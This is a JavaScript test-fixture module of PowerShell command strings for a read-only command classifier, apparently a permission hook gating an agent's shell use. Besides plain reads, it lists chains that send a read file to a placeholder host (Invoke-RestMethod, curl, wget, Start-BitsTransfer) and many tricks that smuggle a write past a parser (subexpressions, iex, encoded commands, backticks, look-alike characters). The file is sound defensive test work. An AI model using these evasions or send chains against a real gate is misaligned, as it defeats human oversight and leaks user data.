'use strict';
// The PowerShell commands the read-only tests judge, kept in one place so the
// grader's tests, the shared definition's tests, the hook's tests and the
// card tests all judge the same text.
//
// Every non-ASCII character is written as an escape, so the source holds none
// of them itself and nothing that reads this file has to guess at an encoding.

// Plain reads. Each runs with no card.
const READS = [
  'Get-Date',
  'Get-Date -Format "HH:mm"',
  "Get-ChildItem | Where-Object Name -like '*.md'",
  'Get-Content notes.md | Select-String TODO',
  'Get-ChildItem; Get-Location',
  'Test-Path notes.md',
];

// Every alias on the list, each as a read.
const ALIASES = [
  'gci', 'dir', 'ls', 'gc notes.md', 'cat notes.md', 'type notes.md',
  'gi notes.md', 'gl', 'pwd', 'sls TODO notes.md', 'echo hi',
];

// Reads written the other ways agents write them.
const READ_SPELLINGS = [
  'GET-content notes.md',
  'get-childitem -Recurse -Filter *.md',
  'Get-ChildItem "$env:USERPROFILE\\.claude" -Force | Select-Object Name, Mode',
  'Get-Content $env:TEMP\\build.log -Tail 20',
  'Get-ChildItem $HOME 2>$null',
  'Get-ChildItem missing 2>&1',
  'Get-ChildItem && Get-Location',
  'Get-Date;',
  'Get-Content caf\u00e9.md',
  'Write-Output $env:PATH',
  'Get-ChildItem C:\\Users\\x\\notes, D:\\archive',
];

// A read, then a write.
const WRITES_AFTER_READ = [
  'Get-Date; Set-Content notes.md x',
  'Get-Content notes.md; Add-Content notes.md x',
  'Get-Content notes.md | Out-File copy.md',
  'Get-Content notes.md | Tee-Object copy.md',
  'Get-Content notes.md > copy.md',
  'Get-Content notes.md >> copy.md',
  'Get-ChildItem 2> errors.txt',
  'Get-ChildItem *> everything.txt',
  'Get-ChildItem | Export-Csv list.csv',
  'Get-Date; New-Item draft.md',
  'Get-Date; Copy-Item notes.md copy.md',
  'Get-Date; Move-Item notes.md old.md',
  'Get-Date; Rename-Item notes.md old.md',
  'Get-Date; Set-Item env:EDITOR vim',
  'Get-Date; sc notes.md x',
  'Get-Date; ac notes.md x',
  'Get-Date; ni draft.md',
  'Get-Date && Set-Content notes.md x',
  'Get-Date || Set-Content notes.md x',
  'Get-Date\nSet-Content notes.md x',
  'Get-Date\r\nSet-Content notes.md x',
];

// A read, then a send.
const SENDS_AFTER_READ = [
  'Get-Content notes.md; Invoke-RestMethod -Method Post -Uri https://example.invalid/in -Body x',
  'Get-Content notes.md | irm https://example.invalid/in -Method Post',
  'Get-Content notes.md; Invoke-WebRequest https://example.invalid/in -Method Post',
  'Get-Content notes.md; iwr https://example.invalid/in',
  'Get-Content notes.md; curl https://example.invalid/in',
  'Get-Content notes.md; wget https://example.invalid/in',
  'Get-Content notes.md; Start-BitsTransfer -Source notes.md -Destination https://example.invalid/in',
  'Get-Content notes.md; Send-MailMessage -To someone -Subject notes -SmtpServer mail.example.invalid',
  'Get-Date; New-Object Net.WebClient',
];

// A command inside a command, or structure the reading does not follow. Each
// row is one construct, so each has a test of its own.
const HIDDEN = [
  ['a command in parentheses', ['Get-Content (Remove-Item notes.md)', 'Write-Output (Set-Content notes.md x)']],
  ['a subexpression', ['Write-Output $(Set-Content notes.md x)']],
  ['a subexpression inside double quotes', ['Write-Output "$(Set-Content notes.md x)"', 'Get-Date -Format "$(Set-Content notes.md x)"']],
  ['an array subexpression', ['Write-Output @(Set-Content notes.md x)']],
  ['a script block passed to Where-Object', ['Get-ChildItem | Where-Object { Remove-Item notes.md }']],
  ['a script block passed to Sort-Object', ['Get-ChildItem | Sort-Object { Set-Content notes.md x }']],
  ['a calculated property in Select-Object', ['Get-Item notes.md | Select-Object @{n="x";e={Remove-Item notes.md}}']],
  ['the call operator', ['Get-Date; & Set-Content notes.md x', "Get-Date; &'Set-Content' notes.md x"]],
  ['the background operator', ['Get-Date & Set-Content notes.md x']],
  ['dot-sourcing', ['Get-Date; . .\\setup.ps1']],
  ['Invoke-Expression and iex', ['Get-Content script.txt | iex', 'Get-Date; Invoke-Expression $script']],
  ['-EncodedCommand', ['Get-Date; powershell -EncodedCommand ZQBjAGgAbwA=']],
  ['starting another PowerShell', ['Get-Date; pwsh -Command "Set-Content notes.md x"', 'Get-Date; powershell -c "Set-Content notes.md x"']],
  ['cmd /c', ['Get-Date; cmd /c "echo x > notes.md"']],
  ['Start-Process', ['Get-Date; Start-Process notepad.exe notes.md']],
  // The second: inside single quotes PowerShell takes a backtick as itself, so
  // the write between the strings runs. Any reading that guesses at escapes
  // can guess wrong, which is why a backtick anywhere is not a read.
  ['a backtick escape', ["Write-Output `'; Set-Content notes.md x; Write-Output `'", "Write-Output 'a`'; Set-Content notes.md x; Write-Output 'b`'"]],
  ['a here-string', ['Write-Output @"\n"\'$(Set-Content notes.md x)\'"\n"@']],
  ['the stop-parsing token', ["Get-Date --% '\nSet-Content notes.md x\nWrite-Output --% '"]],
  ['a comment', ["Get-Date # '\nSet-Content notes.md x\n# '"]],
  ['a command name outside plain ASCII', ['G\u0435t-Date', 'Get\u2010Date']],
  ['a quote outside plain ASCII', ["Write-Output '\u2018; Set-Content notes.md x; Write-Output \u2018'"]],
  ['a dash or a space outside plain ASCII', ['Get-Date \u2013Format x', 'Get-Date\u00a0x', 'Get-Date\u2028Set-Content notes.md x']],
  ['assigning first and running later', ["$x = 'Remove-Item'; & $x notes.md", '$t = Get-Date; Write-Output $t']],
  ['a variable or a type where a command name should be', ['$cmd notes.md', "[IO.File]::WriteAllText('notes.md', 'x')"]],
];

// Text the reading throws on. Each is not a read, whatever else it holds.
const THROWS = [
  ['very long input', `Get-Content ${'a'.repeat(9000)}.md`],
  ['an unbalanced single quote', "Get-Content 'notes.md"],
  ['an unbalanced double quote', 'Get-Content "notes.md'],
  ['an unbalanced parenthesis', 'Get-Content (notes.md'],
  ['an unbalanced brace', 'Get-ChildItem | Where-Object {'],
  ['a lone backtick', 'Get-Date `'],
  ['a character that cannot be decoded', 'Get-Content notes\ud800.md'],
  ['a replacement character', 'Get-Content notes\ufffd.md'],
  ['a control character', 'Get-Content notes\u0000.md'],
];

// Get- by name, and still not a read.
const GET_BUT_NOT_LISTED = ['Get-Clipboard', 'Get-Credential'];

// The chain the card tests deny, retry and allow.
const CARDED_CHAIN = 'Get-Content notes.md; Set-Content notes.md x';

module.exports = {
  READS, ALIASES, READ_SPELLINGS, WRITES_AFTER_READ, SENDS_AFTER_READ, HIDDEN, THROWS, GET_BUT_NOT_LISTED, CARDED_CHAIN,
};
